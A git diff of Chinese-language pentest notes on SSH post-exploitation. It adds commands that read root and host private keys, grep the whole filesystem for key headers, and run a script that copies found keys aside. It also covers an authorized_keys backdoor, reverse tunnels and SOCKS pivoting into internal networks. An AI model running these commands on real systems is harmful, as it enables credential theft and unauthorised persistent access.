@@ -50,54 +50,192 @@ SSH的工作流程包括如下几个阶段:
 
 ```bash
 /home/*
-cat /root/.ssh/authorized\_keys 
+# 存储了允许登录到root用户的SSH公钥，每行一个公钥
+# 格式为 algorithm base64-encoded-public-key comment
+# 例如 ssh-rsa AAAAB3Nxxxxxem9FeM8w+zEmUb+Es= xxl-job
+cat /root/.ssh/authorized_keys 
+# 旧版本SSH(SSH协议版本1)中使用的公钥文件(deprecated)
 cat /root/.ssh/identity.pub 
+# 旧版本SSH(V1)中使用的私钥文件。(deprecated)
 cat /root/.ssh/identity 
-cat /root/.ssh/id\_rsa.pub 
-cat /root/.ssh/id\_rsa 
-cat /root/.ssh/id\_dsa.pub 
-cat /root/.ssh/id\_dsa 
-cat /etc/ssh/ssh\_config 
-cat /etc/ssh/sshd\_config 
-cat /etc/ssh/ssh\_host\_dsa\_key.pub 
-cat /etc/ssh/ssh\_host\_dsa\_key 
-cat /etc/ssh/ssh\_host\_rsa\_key.pub 
-cat /etc/ssh/ssh\_host\_rsa\_key 
-cat /etc/ssh/ssh\_host\_key.pub 
-cat /etc/ssh/ssh\_host\_key
-cat ~/.ssh/authorized\_keys 
+# 存储了 root 用户的 SSH 公钥 - SSH V2, 采用 RSA 算法
+cat /root/.ssh/id_rsa.pub 
+# root 的 ssh 私钥 - SSH V2, 采用 RSA 算法
+cat /root/.ssh/id_rsa 
+# 存储了 root 用户的 SSH 公钥 - SSH V2, 采用 DSA 算法
+cat /root/.ssh/id_dsa.pub 
+# root 的 ssh 私钥 - SSH V2, 采用 DSA 算法
+cat /root/.ssh/id_dsa 
+# SSH 客户端全局配置文件, 定义了 SSH 客户端连接到 SSH 服务器时的一些选项, 例如端口号, 超时时间, 加密算法等
+cat /etc/ssh/ssh_config 
+# SSH 服务器全局配置文件, 定义了SSH服务器接受SSH客户端连接时的一些选项，例如监听地址，最大连接数，认证方式等。
+cat /etc/ssh/sshd_config 
+# SSH 服务器的 DSA 主机密钥对的公钥文件
+cat /etc/ssh/ssh_host_dsa_key.pub 
+# SSH 服务器的 DSA 主机密钥对的私钥文件
+cat /etc/ssh/ssh_host_dsa_key 
+# SSH 服务器的 RSA 主机密钥对的公钥文件
+cat /etc/ssh/ssh_host_rsa_key.pub 
+# SSH 服务器的 RSA 主机密钥对的私钥文件
+cat /etc/ssh/ssh_host_rsa_key 
+# 旧版本SSH(V1)中 SSH 服务器的 SSH 公钥, 格式为二进制数据(deprecated)
+cat /etc/ssh/ssh_host_key.pub 
+# 旧版本SSH(V1)中 SSH 服务器的 SSH 私钥, 格式为二进制数据(deprecated)
+cat /etc/ssh/ssh_host_key
+# 存储了允许登录到当前用户的SSH公钥，每行一个公钥
+cat ~/.ssh/authorized_keys 
+# 旧版本SSH(V1)中使用的公钥文件(deprecated)
 cat ~/.ssh/identity.pub 
+# 旧版本SSH(V1)中使用的私钥文件。(deprecated)
 cat ~/.ssh/identity 
-cat ~/.ssh/id\_rsa.pub 
-cat ~/.ssh/id\_rsa 
-cat ~/.ssh/id\_dsa.pub 
-cat ~/.ssh/id\_dsa 
+cat ~/.ssh/id_rsa.pub 
+cat ~/.ssh/id_rsa 
+cat ~/.ssh/id_dsa.pub 
+cat ~/.ssh/id_dsa 
 ```
 
-也可以::
+也可以:
 
 ```bash
-grep -irv "-----BEGIN RSA PRIVATE KEY-----" /home/*
-grep -irv "BEGIN DSA PRIVATE KEY" /home/*
+grep -rliF "ssh-rsa" /* --exclude=*.jar
+grep -rliF "BEGIN RSA PRIVATE KEY" /* --exclude=*.jar
+grep -rliF "BEGIN DSA PRIVATE KEY" /* --exclude=*.jar
+grep -rliF "BEGIN OPENSSH PRIVATE KEY" /* --exclude=*.jar
 
-grep -irv "BEGIN RSA PRIVATE KEY" /*
-grep -irv "BEGIN DSA PRIVATE KEY" /*
+grep -rli "ssh-rsa\|BEGIN RSA PRIVATE KEY\|BEGIN DSA PRIVATE KEY\|BEGIN OPENSSH PRIVATE KEY" /* --exclude=*.jar
+
+grep -rli "BEGIN RSA PRIVATE KEY\|BEGIN DSA PRIVATE KEY\|BEGIN OPENSSH PRIVATE KEY" /etc/ssh/* /root/* /home/* --exclude=*.{jar,py,pyc,js} --binary-files=without-match
 ```
+- `-r`: 递归搜索
+- `-l`: 只显示文件名
+- `-F`: 按照固定字符串搜索(不加 `-F`, 默认按照正则表达式搜索)
+- `-i`: 忽略大小写
+- `--exclude=*.jar`: 排除 jar 文件
+- `--binary-files=without-match`: 不匹配二进制文件
+
+![image-20231107142147662](http://cdn.ayusummer233.top/DailyNotes/202311071421842.png)
+
+```bash
+#! /bin/bash
+if [ ! -d "res" ]; then
+    mkdir res
+fi
+
+files=$(
+    grep -rli "BEGIN RSA PRIVATE KEY\|BEGIN DSA PRIVATE KEY\|BEGIN OPENSSH PRIVATE KEY" /etc/ssh/* /root/* /home/* --exclude=*.{jar,py,pyc,js} --binary-files=without-match
+)
+
+for file in $files; do
+    cp $file res/
+done
+
+echo "Done!"
+
+```
+
+![image-20231107145935222](http://cdn.ayusummer233.top/DailyNotes/202311071459298.png)
 
 找到密钥后需要确认其可以用于哪些主机, 可以检查如下文件:
 
 ```bash
+# Hosts 文件, 用于将主机名映射到 IP 地址
 /etc/hosts 
-~/.known_hosts
+# ssh 目录下的 known_hosts 文件, 用于存储 SSH 客户端连接过的 SSH 服务器的公钥
+~/.ssh/known_hosts
+# bash 历史命令文件, 用于存储用户执行过的命令
 ~/.bash_history 
+# ssh 目录下的 config 文件, 用于存储 SSH 客户端的配置信息, 也可能不叫 config 而是其他自定义的名称, 存储了 SSH 客户端的配置信息, 例如 ip, 端口号, 密钥, 代理等
 ~/.ssh/config 
 ```
+
+- `/etc/hosts`
+
+  ![image-20231107143043264](http://cdn.ayusummer233.top/DailyNotes/202311071430224.png)
+
+- `~/.ssh/known_hosts`
+
+  ![image-20231107143714474](http://cdn.ayusummer233.top/DailyNotes/202311071437623.png)
+
+- `~/.bash_history `
+
+  ![image-20231107145403504](http://cdn.ayusummer233.top/DailyNotes/202311071454845.png)
+
+- `~/.ssh/config `
+
+  ![image-20231107145553483](http://cdn.ayusummer233.top/DailyNotes/202311071455536.png)
 
 ---
 
 ## SSH 密码后门
 
 在攻击机上生成一对密钥,将公钥贴在受感染主机的 `~/.ssh/authorized_keys` 中
+
+```bash
+ssh-keygen -t rsa -C "备注信息"
+```
+
+然后将生成的 `.pub` 公钥放在受感染主机的 `~/.ssh/authorized_keys` 中即可使用本地的私钥 SSH 连接到受感染主机了
+
+> 例如在 Redis 未授权写公钥中就是将公钥写入了 `authorized_keys` 中再 SSH 连接的
+
+---
+
+## SSH 反向隧道
+
+### 断网主机联网
+
+```bash
+ssh -fNR 7890:localhost:7890 -i [ssh私钥绝对路径] [用户名]@[服务器IP]
+```
+
+- `-f` 后台运行
+- `-N` 不执行远程命令, 仅做端口转发
+- `-R` 远程端口转发
+
+如此一来就可以在服务器上使用本地的 Clash 代理了
+
+- `http代理`: `http://localhost:7890`
+- `socks5代理`: `socks5://localhost:7890`
+
+在打内网时可以由此实现断网主机联网的效果
+
+---
+
+### 转发流量
+
+```bash
+ssh -fND localhost:12345 -i [私钥路径] root@192.168.1.96
+```
+
+- `-f` 表示在后台运行 ssh 命令, 不占用终端
+- `-N` 表示不执行远程命令,只做端口转发
+- `-D localhost:12345` 表示创建一个动态端口转发, 将本地主机的 12345 端口作为 socks 代理
+- `-i [私钥路径]` 表示使用指定私钥文件进行身份验证
+- `root@192.168.1.96` 表示以 root 用户登录远程主机 192.168.1.96
+
+这个命令可以使得通过 ssh 隧道访问远程主机上的网络服务, 或者使用远程主机作为代理访问其他网站
+
+![image-20230330173345557](http://cdn.ayusummer233.top/DailyNotes/202304041354643.png)
+
+挂上后命令行会卡在这里 然后 Firefox 配置 socks 5 代理
+
+![image-20230330180127369](http://cdn.ayusummer233.top/DailyNotes/202304041354163.png)
+
+如此这般就可以从本地的 Firefox 挂 96 的代理访问内网其他的服务了
+
+除此以外还可以再套一层 Burpsuit: `BurpSuit -> Proxy Setting -> Network->Connections->Socks proxy`
+
+![](http://cdn.ayusummer233.top/DailyNotes/202304041354182.png)
+
+配置 BurpSuit http 代理监听:
+
+![](http://cdn.ayusummer233.top/DailyNotes/202304041354730.png)
+
+配置 Firefox http 代理
+
+![](http://cdn.ayusummer233.top/DailyNotes/202304041354257.png)
+
+
 
 ---
 
@@ -120,15 +258,15 @@ SSH 代理的工作原理是允许一个中间机器 SSH Server 将 Local Host �
 ```mermaid
 graph LR
     subgraph Client
-        A((Local Host))
+        A((Local Host-<br>100.1.1.131))
     end
 
     subgraph Server
-        B((Remote Host))
+        B((Remote Host-<br>192.168.1.211))
     end
 
     subgraph SSH Server
-        C((SSH Server))
+        C((Proxy-<br>192.168.1.215))
     end
 
     A -->|SSH Connection| C
@@ -143,6 +281,23 @@ graph LR
 ### 劫持 SSH 代理转发
 
 SSH 代理转发允许用户在不输入密码的情况下连接到其他机器。当存在活动会话时，可以利用此功能访问受感染用户 SSH 密钥有权访问的任何主机（无需直接访问密钥）。
+
+```bash
+# 常规使用SSH密钥连接远程主机:
+ssh -i [私钥路径] [账户]/[主机]
+# 使用 SSH 代理转发, 通过中间主机转发 SSH 密钥连接远程主机:
+ssh -i [远程私钥路径] -o ProxyCommand="ssh -i [本地私钥路径] -W %h:%p [中间主机账户]/[中间主机]" [账户]/[远程主机]
+```
+- `-i`: 指定私钥路径
+- `-o ProxyCommand`: 指定代理命令
+- `-W %h:%p`: 指定代理命令的参数, `%h` 为远程主机, `%p` 为远程主机的端口号
+  > 将SSH连接建立到远程主机hostname，并且将本地流量通过SSH通道传送到远程主机的%h和%p所表示的目标主机和端口。
+
+---
+
+```bash
+ssh -i [本地私钥路径] -o ProxyCommand="ssh -i [中间跳板1的私钥路径] -W %h:%p [中间跳板1的用户名]@[中间跳板1的主机名或IP地址] | ssh -i [中间跳板2的私钥路径] -W %h:%p [中间跳板2的用户名]@[中间跳板2的主机名或IP地址]" [目标主机的用户名]@[目标主机的主机名或IP地址]
+```
 
 
 
